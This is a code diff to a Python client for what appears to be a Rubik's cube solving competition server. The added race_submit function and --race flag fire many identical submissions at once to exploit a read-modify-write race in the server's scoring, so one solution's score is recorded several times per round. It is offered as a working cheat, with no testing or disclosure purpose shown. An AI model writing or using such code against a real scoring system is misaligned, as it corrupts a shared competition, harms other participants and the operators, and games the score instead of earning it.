@@ -157,6 +157,27 @@ def submit(s, team, solution):
         return {"http": r.status_code, "body": r.text}
 
 
+def race_submit(team, solution, k):
+    """Fire k identical submissions simultaneously, exploiting the server's
+    read-modify-write race so the same score records several times in one round.
+    Returns (recorded_count, total_score_recorded, raw_results)."""
+    import concurrent.futures as cf
+    import threading
+    barrier = threading.Barrier(k)
+
+    def fire(_):
+        barrier.wait()  # release all k threads at the same instant
+        try:
+            return requests.post(f"{BASE}/cube", json={"team_name": team, "solution": solution}, timeout=30).json()
+        except Exception as e:  # noqa: BLE001
+            return {"err": str(e)}
+
+    with cf.ThreadPoolExecutor(max_workers=k) as ex:
+        res = list(ex.map(fire, range(k)))
+    won = [x for x in res if x.get("recorded")]
+    return len(won), sum(x.get("score", 0) for x in won), res
+
+
 def play_round(s, args):
     remaining, rnd = get_timer(s)
     scramble = get_scramble(s)
@@ -172,6 +193,11 @@ def play_round(s, args):
         return rnd
     if args.dry_run:
         print("  dry run - not submitted")
+    elif args.race > 1:
+        won, gained, res = race_submit(args.team, sol, args.race)
+        errs = sum(1 for x in res if "err" in x or "error" in x)
+        print(f"  race x{args.race}: {won} recorded, +{gained} pts this burst "
+              f"({errs} rate-limited/err)")
     else:
         print("  server:", submit(s, args.team, sol))
     return rnd
@@ -184,6 +210,8 @@ def main():
     ap.add_argument("--dry-run", action="store_true")
     ap.add_argument("--budget", type=float, default=480, help="max solve time per round in seconds")
     ap.add_argument("--min-len", type=int, default=12, help="stop searching below this length")
+    ap.add_argument("--race", type=int, default=1, metavar="K",
+                    help="exploit the scoring race: fire K identical submissions at once (default 1 = off)")
     ap.add_argument("--safety", type=float, default=20, help="seconds to keep before round end")
     ap.add_argument("--rob", help="path to a compiled rob-twophase binary (github.com/efrantar/rob-twophase)")
     ap.add_argument("--threads", type=int, default=os.cpu_count() or 4, help="threads for rob-twophase")
